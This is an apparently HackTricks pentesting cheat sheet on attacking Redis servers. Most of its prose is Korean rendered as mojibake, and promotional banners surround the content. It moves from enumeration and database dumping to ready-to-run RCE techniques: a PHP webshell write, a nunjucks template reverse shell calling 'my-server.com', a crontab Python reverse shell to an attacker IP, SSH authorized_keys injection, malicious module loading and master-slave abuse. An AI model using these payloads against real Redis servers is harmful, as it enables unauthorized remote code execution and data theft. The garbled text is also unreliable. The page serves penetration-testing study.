# 6379 - Pentesting Redis

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ ìˆëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**Real-Time Hack News**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ìµœì‹  ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

**Latest Announcements**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹°ì™€ ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ìµœì‹  ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Basic Information

From [the docs](https://redis.io/topics/introduction): RedisëŠ” ì˜¤í”ˆ ì†ŒìŠ¤(BSD ë¼ì´ì„¼ìŠ¤) ì¸ë©”ëª¨ë¦¬ **ë°ì´í„° êµ¬ì¡° ì €ì¥ì†Œ**ë¡œ, **ë°ì´í„°ë² ì´ìŠ¤**, ìºì‹œ ë° ë©”ì‹œì§€ ë¸Œë¡œì»¤ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ RedisëŠ” ì¼ë°˜ í…ìŠ¤íŠ¸ ê¸°ë°˜ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì§€ë§Œ, **ssl/tls**ë¥¼ êµ¬í˜„í•  ìˆ˜ë„ ìˆë‹¤ëŠ” ì ì„ ì—¼ë‘ì— ë‘ì–´ì•¼ í•©ë‹ˆë‹¤. [ì—¬ê¸°ì—ì„œ ssl/tlsë¡œ Redisë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ë°°ìš°ì„¸ìš”](https://fossies.org/linux/redis/TLS.md).

**Default port:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## ìë™ ì—´ê±°

Redis ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ì •ë³´ë¥¼ ì–»ëŠ” ë° ë„ì›€ì´ ë˜ëŠ” ëª‡ ê°€ì§€ ìë™í™” ë„êµ¬:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## ìˆ˜ë™ ì—´ê±°

### ë°°ë„ˆ

RedisëŠ” **í…ìŠ¤íŠ¸ ê¸°ë°˜ í”„ë¡œí† ì½œ**ì…ë‹ˆë‹¤. ì†Œì¼“ì— **ëª…ë ¹ì„ ì „ì†¡**í•˜ë©´ ë°˜í™˜ëœ ê°’ì´ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ RedisëŠ” **ssl/tls**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹¤í–‰ë  ìˆ˜ ìˆë‹¤ëŠ” ì ì„ ê¸°ì–µí•˜ì„¸ìš”(í•˜ì§€ë§Œ ì´ëŠ” ë§¤ìš° ì´ìƒí•©ë‹ˆë‹¤).

ì¼ë°˜ Redis ì¸ìŠ¤í„´ìŠ¤ì—ì„œëŠ” `nc`ë¥¼ ì‚¬ìš©í•˜ì—¬ ì—°ê²°í•˜ê±°ë‚˜ `redis-cli`ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
ì²« ë²ˆì§¸ ëª…ë ¹ì–´ë¡œ ì‹œë„í•  ìˆ˜ ìˆëŠ” ê²ƒì€ **`info`**ì…ë‹ˆë‹¤. ì´ëŠ” Redis ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ì •ë³´ê°€ í¬í•¨ëœ ì¶œë ¥ì„ ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ **ë˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê²ƒì´ ë°˜í™˜ë©ë‹ˆë‹¤:**
```
-NOAUTH Authentication required.
```
In this last case, this means that **you need valid credentials** to access the Redis instance.

### Redis Authentication

**ê¸°ë³¸ì ìœ¼ë¡œ** RedisëŠ” **ìê²© ì¦ëª… ì—†ì´** ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ë¹„ë°€ë²ˆí˜¸ë§Œ ë˜ëŠ” ì‚¬ìš©ì ì´ë¦„ + ë¹„ë°€ë²ˆí˜¸**ë¥¼ ì§€ì›í•˜ë„ë¡ **êµ¬ì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
`requirepass` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ _**redis.conf**_ íŒŒì¼ì— **ë¹„ë°€ë²ˆí˜¸ë¥¼ ì„¤ì •**í•  ìˆ˜ ìˆìœ¼ë©°, ì„œë¹„ìŠ¤ê°€ ì¬ì‹œì‘ë  ë•Œê¹Œì§€ **ì„ì‹œ**ë¡œ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—°ê²°í•œ í›„ ë‹¤ìŒì„ ì‹¤í–‰í•©ë‹ˆë‹¤: `config set requirepass p@ss$12E45`.\
ë˜í•œ, _**redis.conf**_ íŒŒì¼ì˜ `masteruser` ë§¤ê°œë³€ìˆ˜ì—ì„œ **ì‚¬ìš©ì ì´ë¦„**ì„ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
ë¹„ë°€ë²ˆí˜¸ë§Œ êµ¬ì„±ëœ ê²½ìš° ì‚¬ìš©ë˜ëŠ” ì‚¬ìš©ì ì´ë¦„ì€ "**default**"ì…ë‹ˆë‹¤.\
ë˜í•œ, Redisê°€ ë¹„ë°€ë²ˆí˜¸ë§Œ ë˜ëŠ” ì‚¬ìš©ì ì´ë¦„ + ë¹„ë°€ë²ˆí˜¸ë¡œ êµ¬ì„±ë˜ì—ˆëŠ”ì§€ **ì™¸ë¶€ì—ì„œ í™•ì¸í•  ë°©ë²•ì´ ì—†ìŠµë‹ˆë‹¤**.
{% endhint %}

In cases like this one you will **need to find valid credentials** to interact with Redis so you could try to [**brute-force**](../generic-methodologies-and-resources/brute-force.md#redis) it.\
**ìœ íš¨í•œ ìê²© ì¦ëª…ì„ ì°¾ì€ ê²½ìš° ì—°ê²°ì„ ì„¤ì •í•œ í›„ ì„¸ì…˜ì„ ì¸ì¦í•´ì•¼ í•©ë‹ˆë‹¤** ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ:
```bash
AUTH <username> <password>
```
**ìœ íš¨í•œ ìê²© ì¦ëª…**ì€ ë‹¤ìŒê³¼ ê°™ì´ ì‘ë‹µë©ë‹ˆë‹¤: `+OK`

### **ì¸ì¦ëœ ì—´ê±°**

Redis ì„œë²„ê°€ **ìµëª… ì—°ê²°**ì„ í—ˆìš©í•˜ê±°ë‚˜ ìœ íš¨í•œ ìê²© ì¦ëª…ì„ ì–»ì€ ê²½ìš°, ë‹¤ìŒ **ëª…ë ¹ì–´**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ì˜ ì—´ê±° í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**ë‹¤ë¥¸ Redis ëª…ë ¹ì–´** [**ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://redis.io/topics/data-types-intro) **ê·¸ë¦¬ê³ ** [**ì—¬ê¸°ì—ì„œ**](https://lzone.de/cheat-sheet/Redis)**.**

ì¸ìŠ¤í„´ìŠ¤ì˜ **Redis ëª…ë ¹ì–´ëŠ”** _redis.conf_ íŒŒì¼ì—ì„œ ì´ë¦„ì„ ë³€ê²½í•˜ê±°ë‚˜ ì œê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì´ ì¤„ì€ FLUSHDB ëª…ë ¹ì–´ë¥¼ ì œê±°í•©ë‹ˆë‹¤:
```
rename-command FLUSHDB ""
```
More about configuring securely a Redis service here: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

You can also **ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ì‹¤ì‹œê°„ìœ¼ë¡œ Redis ëª…ë ¹ì–´** executed with the command **`monitor`** or get the top **25 ëŠë¦° ì¿¼ë¦¬** with **`slowlog get 25`**

Find more interesting information about more Redis commands here: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Dumping Database**

Inside Redis the **ë°ì´í„°ë² ì´ìŠ¤ëŠ” 0ë¶€í„° ì‹œì‘í•˜ëŠ” ìˆ«ìì…ë‹ˆë‹¤**. You can find if anyone is used in the output of the command `info` inside the "Keyspace" chunk:

![](<../.gitbook/assets/image (766).png>)

Or you can just get all the **í‚¤ìŠ¤í˜ì´ìŠ¤** (databases) with:
```
INFO keyspace
```
ê·¸ ì˜ˆì œì—ì„œëŠ” **ë°ì´í„°ë² ì´ìŠ¤ 0ê³¼ 1**ì´ ì‚¬ìš©ë˜ê³  ìˆìŠµë‹ˆë‹¤. **ë°ì´í„°ë² ì´ìŠ¤ 0ì—ëŠ” 4ê°œì˜ í‚¤ê°€ ìˆê³  ë°ì´í„°ë² ì´ìŠ¤ 1ì—ëŠ” 1ê°œê°€ ìˆìŠµë‹ˆë‹¤**. ê¸°ë³¸ì ìœ¼ë¡œ RedisëŠ” ë°ì´í„°ë² ì´ìŠ¤ 0ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ë°ì´í„°ë² ì´ìŠ¤ 1ì„ ë¤í”„í•˜ë ¤ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
`GET <KEY>`ë¥¼ ì‹¤í–‰í•˜ëŠ” ë™ì•ˆ `-WRONGTYPE Operation against a key holding the wrong kind of value`ë¼ëŠ” ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´, ì´ëŠ” í‚¤ê°€ ë¬¸ìì—´ì´ë‚˜ ì •ìˆ˜ê°€ ì•„ë‹Œ ë‹¤ë¥¸ ìœ í˜•ì¼ ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í‘œì‹œí•˜ê¸° ìœ„í•´ íŠ¹ë³„í•œ ì—°ì‚°ìê°€ í•„ìš”í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

í‚¤ì˜ ìœ í˜•ì„ í™•ì¸í•˜ë ¤ë©´ `TYPE` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì„¸ìš”. ì•„ë˜ëŠ” ë¦¬ìŠ¤íŠ¸ ë° í•´ì‹œ í‚¤ì— ëŒ€í•œ ì˜ˆì…ë‹ˆë‹¤.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**npmìœ¼ë¡œ ë°ì´í„°ë² ì´ìŠ¤ ë¤í”„í•˜ê¸°** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **ë˜ëŠ” python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ì´ í’ë¶€í•œ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ì°¸ì—¬í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ ìˆëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ì˜ ìµœì‹  ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ìœ ì§€í•˜ì„¸ìš”.

ì˜¤ëŠ˜ [**Discord**](https://discord.com/invite/N3FrSbmwdy)ì—ì„œ ì €í¬ì™€ í•¨ê»˜í•˜ê³  ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## Redis RCE

### ì¸í„°ë™í‹°ë¸Œ ì…¸

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server)ëŠ” Redis(<=5.0.5)ì—ì„œ ìë™ìœ¼ë¡œ ì¸í„°ë™í‹°ë¸Œ ì…¸ ë˜ëŠ” ë¦¬ë²„ìŠ¤ ì…¸ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

[**ì—¬ê¸°**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html)ì—ì„œ ì •ë³´. **ì›¹ ì‚¬ì´íŠ¸ í´ë”**ì˜ **ê²½ë¡œ**ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
â€‹ì›¹ì‰˜ ì ‘ê·¼ ì˜ˆì™¸ê°€ ë°œìƒí•˜ë©´, ë°±ì—… í›„ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë¹„ìš°ê³  ë‹¤ì‹œ ì‹œë„í•  ìˆ˜ ìˆìœ¼ë©°, ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë³µì›í•˜ëŠ” ê²ƒì„ ìŠì§€ ë§ˆì‹­ì‹œì˜¤.

### í…œí”Œë¦¿ ì›¹ì‰˜

ì´ì „ ì„¹ì…˜ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ í…œí”Œë¦¿ ì—”ì§„ì— ì˜í•´ í•´ì„ë  ì¼ë¶€ HTML í…œí”Œë¦¿ íŒŒì¼ì„ ë®ì–´ì“°ê³  ì‰˜ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, [**ì´ ê¸€**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/)ì„ ë”°ë¥´ë©´, ê³µê²©ìê°€ **nunjucks í…œí”Œë¦¿ ì—”ì§„**ì— ì˜í•´ í•´ì„ëœ **HTMLì— rev shellì„ ì£¼ì…í•œ** ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
ë‹¤ìˆ˜ì˜ í…œí”Œë¦¿ ì—”ì§„ì´ í…œí”Œë¦¿ì„ ë©”ëª¨ë¦¬ì— ìºì‹œí•˜ë¯€ë¡œ, ì´ë¥¼ ë®ì–´ì“°ë”ë¼ë„ ìƒˆë¡œìš´ í…œí”Œë¦¿ì´ ì‹¤í–‰ë˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°, ê°œë°œìê°€ ìë™ ì¬ë¡œë“œë¥¼ í™œì„±í™”í•œ ìƒíƒœì´ê±°ë‚˜ ì„œë¹„ìŠ¤ì— ëŒ€í•´ DoSë¥¼ ìˆ˜í–‰í•´ì•¼ í•˜ë©° (ìë™ìœ¼ë¡œ ì¬ì‹œì‘ë  ê²ƒìœ¼ë¡œ ì˜ˆìƒí•´ì•¼ í•¨) ì£¼ì˜í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}

### SSH

ì˜ˆì‹œ [ì—¬ê¸°ì„œ](https://blog.adithyanak.com/oscp-preparation-guide/enumeration) í™•ì¸í•˜ì„¸ìš”.

**`config get dir`** ê²°ê³¼ëŠ” ë‹¤ë¥¸ ìˆ˜ë™ ìµìŠ¤í”Œë¡œì‡ ëª…ë ¹ì–´ í›„ì— ë³€ê²½ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Redisì— ë¡œê·¸ì¸í•œ ì§í›„ì— ì´ë¥¼ ë¨¼ì € ì‹¤í–‰í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. **`config get dir`**ì˜ ì¶œë ¥ì—ì„œ **redis ì‚¬ìš©ì**ì˜ **home**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë³´í†µ _/var/lib/redis_ ë˜ëŠ” _/home/redis/.ssh_). ì´ë¥¼ ì•Œë©´ `authenticated_users` íŒŒì¼ì„ ì‘ì„±í•˜ì—¬ **redis ì‚¬ìš©ì**ë¡œ sshì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ìœ„ì¹˜ë¥¼ ì•Œê²Œ ë©ë‹ˆë‹¤. ì“°ê¸° ê¶Œí•œì´ ìˆëŠ” ë‹¤ë¥¸ ìœ íš¨í•œ ì‚¬ìš©ìì˜ homeì„ ì•Œê³  ìˆë‹¤ë©´ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

1. PCì—ì„œ ssh ê³µê°œ-ê°œì¸ í‚¤ ìŒì„ ìƒì„±í•©ë‹ˆë‹¤: **`ssh-keygen -t rsa`**
2. ê³µê°œ í‚¤ë¥¼ íŒŒì¼ì— ì‘ì„±í•©ë‹ˆë‹¤: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. íŒŒì¼ì„ Redisì— ê°€ì ¸ì˜µë‹ˆë‹¤: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Redis ì„œë²„ì˜ **authorized\_keys** íŒŒì¼ì— ê³µê°œ í‚¤ë¥¼ ì €ì¥í•©ë‹ˆë‹¤:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. ë§ˆì§€ë§‰ìœ¼ë¡œ, ê°œì¸ í‚¤ë¡œ **redis ì„œë²„**ì— **ssh**ë¡œ ì ‘ì†í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: **ssh -i id\_rsa redis@10.85.0.52**

**ì´ ê¸°ìˆ ì€ ì—¬ê¸°ì—ì„œ ìë™í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
The last example is for Ubuntu, for **Centos**, the above command should be: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

ì´ ë°©ë²•ì€ ë¹„íŠ¸ì½”ì¸ì„ ì–»ëŠ” ë°ì—ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [yam](https://www.v2ex.com/t/286981#reply14)

### Load Redis Module

1. [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)ì˜ ì§€ì¹¨ì„ ë”°ë¥´ë©´ **ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ redis ëª¨ë“ˆì„ ì»´íŒŒì¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. ê·¸ëŸ° ë‹¤ìŒ **ì»´íŒŒì¼ëœ** ëª¨ë“ˆì„ **ì—…ë¡œë“œí•  ë°©ë²•**ì´ í•„ìš”í•©ë‹ˆë‹¤.
3. `MODULE LOAD /path/to/mymodule.so`ë¡œ ëŸ°íƒ€ì„ì— **ì—…ë¡œë“œëœ ëª¨ë“ˆì„ ë¡œë“œ**í•©ë‹ˆë‹¤.
4. `MODULE LIST`ë¡œ **ë¡œë“œëœ ëª¨ë“ˆì„ ë‚˜ì—´**í•˜ì—¬ ì˜¬ë°”ë¥´ê²Œ ë¡œë“œë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
5. **ëª…ë ¹ì„ ì‹¤í–‰**í•©ë‹ˆë‹¤:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. ì›í•  ë•Œë§ˆë‹¤ ëª¨ë“ˆì„ ì–¸ë¡œë“œí•©ë‹ˆë‹¤: `MODULE UNLOAD mymodule`

### LUA sandbox bypass

[**ì—¬ê¸°**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)ì—ì„œ Redisê°€ **EVAL** ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ **Lua ì½”ë“œë¥¼ ìƒŒë“œë°•ìŠ¤í™”í•˜ì—¬ ì‹¤í–‰**í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§í¬ëœ ê²Œì‹œë¬¼ì—ì„œ **dofile** í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì•…ìš©í•˜ëŠ” ë°©ë²•**ì„ ë³¼ ìˆ˜ ìˆì§€ë§Œ, [ëª…ë°±íˆ](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) ë” ì´ìƒ ê°€ëŠ¥í•˜ì§€ ì•Šì€ ê²ƒ ê°™ìŠµë‹ˆë‹¤. ì–´ì¨Œë“ , **Lua** ìƒŒë“œë°•ìŠ¤ë¥¼ **ìš°íšŒ**í•  ìˆ˜ ìˆë‹¤ë©´ ì‹œìŠ¤í…œì—ì„œ **ì„ì˜ì˜** ëª…ë ¹ì„ **ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, ê°™ì€ ê²Œì‹œë¬¼ì—ì„œ **DoSë¥¼ ìœ ë°œí•  ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ ì˜µì…˜**ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**LUAì—ì„œ íƒˆì¶œí•˜ê¸° ìœ„í•œ CVE**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### Master-Slave Module

ë§ˆìŠ¤í„° redisì˜ ëª¨ë“  ì‘ì—…ì€ ìë™ìœ¼ë¡œ ìŠ¬ë ˆì´ë¸Œ redisì— ë™ê¸°í™”ë˜ë¯€ë¡œ, ì·¨ì•½í•œ redisë¥¼ ìŠ¬ë ˆì´ë¸Œ redisë¡œ ê°„ì£¼í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ìš°ë¦¬ê°€ ì œì–´í•˜ëŠ” ë§ˆìŠ¤í„° redisì— ì—°ê²°ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ìì‹ ì˜ redisì— ëª…ë ¹ì„ ì…ë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF talking to Redis

ë§Œì•½ **Redis**ì— **ì¼ë°˜ í…ìŠ¤íŠ¸** ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆë‹¤ë©´, **ê·¸ì™€ í†µì‹ í•  ìˆ˜** ìˆìŠµë‹ˆë‹¤. RedisëŠ” ìš”ì²­ì„ í•œ ì¤„ì”© ì½ê³  ì´í•´í•˜ì§€ ëª»í•˜ëŠ” ì¤„ì— ëŒ€í•´ì„œëŠ” ì˜¤ë¥˜ë¡œ ì‘ë‹µí•  ê²ƒì…ë‹ˆë‹¤:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
ë”°ë¼ì„œ, ì›¹ì‚¬ì´íŠ¸ì—ì„œ **SSRF vuln**ì„ ë°œê²¬í•˜ê³  ì¼ë¶€ **headers**(ì•„ë§ˆë„ CRLF vulnìœ¼ë¡œ) ë˜ëŠ” **POST parameters**ë¥¼ **ì œì–´**í•  ìˆ˜ ìˆë‹¤ë©´, ì„ì˜ì˜ ëª…ë ¹ì„ Redisì— ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì˜ˆì‹œ: Gitlab SSRF + CRLF to Shell

**Gitlab11.4.7**ì—ì„œ **SSRF** ì·¨ì•½ì ê³¼ **CRLF**ê°€ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. **SSRF** ì·¨ì•½ì ì€ ìƒˆ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•  ë•Œ **URLì—ì„œ í”„ë¡œì íŠ¸ ê°€ì ¸ì˜¤ê¸° ê¸°ëŠ¥**ì— ìˆì—ˆìœ¼ë©°, \[0:0:0:0:0:ffff:127.0.0.1] í˜•ì‹ì˜ ì„ì˜ IPì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•´ì£¼ì—ˆìŠµë‹ˆë‹¤(ì´ëŠ” 127.0.0.1ì— ì ‘ê·¼í•©ë‹ˆë‹¤). ê·¸ë¦¬ê³  **CRLF** vulnì€ **URL**ì— **%0D%0A** ë¬¸ìë¥¼ ì¶”ê°€í•˜ì—¬ ì•…ìš©ë˜ì—ˆìŠµë‹ˆë‹¤.

